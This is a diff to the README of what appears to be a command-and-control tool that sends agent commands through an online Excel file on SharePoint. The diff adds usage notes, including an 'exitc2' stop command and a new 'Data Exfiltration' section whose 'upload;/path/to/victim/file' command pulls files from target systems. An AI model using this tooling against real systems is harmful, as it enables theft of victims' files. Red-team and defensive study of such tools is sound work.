@@ -95,7 +95,30 @@ The program will read the instructions from the 0,0 Cell in Excel file and execu
 
 Note that - for now - cert.pfx file and private.json must be in same folder of the executable.
 
-Insert command "exitc2" in order to remotely stop the agent.
+Insert command 
+
+```
+exitc2
+
+```
+
+in online excel c2 file order to remotely stop the agent.
+
+## Data Exfiltration
+
+Insert command:
+
+```
+
+upload;/path/to/victim/file
+
+```
+
+in order to upload files from target sytems:
+
+![image](https://github.com/giovannicolonna/c2point/assets/10105061/79105667-0b9a-450a-b929-cbb66ab9d02d)
+
+
 
 ## Output
 Check your Sharepoint site. A file (default: output.xlsx) will contain the output of your command.
